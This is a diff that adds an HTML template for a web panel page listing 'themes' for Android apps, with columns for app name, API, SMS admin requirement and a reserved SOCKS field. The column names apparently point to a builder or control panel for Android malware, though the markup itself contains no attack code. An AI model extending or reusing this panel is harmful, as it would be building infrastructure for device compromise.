@@ -1,0 +1,46 @@
+<div class='row'>&nbsp;</div>
+<div class='row'>
+
+	<div class='col-md-1'>
+		<a href='start.py?action=index&client_id=%CLIENT_ID%'>
+			<button type='button' class='btn btn-primary'>Back</button>
+		</a>
+	</div>
+
+	<div class='col-md-11'>
+		
+			<table id='table' class="table table-bordered" style='background-color: white'>
+				<tr style='background-color: #E6ECED'>
+					<td>All themes</td>
+				</tr>
+				<tr>
+					<td>
+						
+					<table class='table table-bordered'>
+						<tr>
+							<th>icon_set</th>
+							<th>app_name</th>
+							<th>api</th>
+							<th>sms_admin_required</th>
+							<th>socks (reserved)</th>
+							<th>action</th>
+						</tr>
+						
+						%THEMES_LIST%
+					</table>
+						
+						
+					</td>
+				</tr>
+			</table>
+		
+	</div>
+</div>
+<script>
+function showIcon(name)
+{
+	$('#icon').attr('src', 'app_icons/'+name+'/drawable-xhdpi/ic_launcher181.png')
+	$('#icon').show()
+}
+//showIcon('%ICON_FIRST%')
+</script>
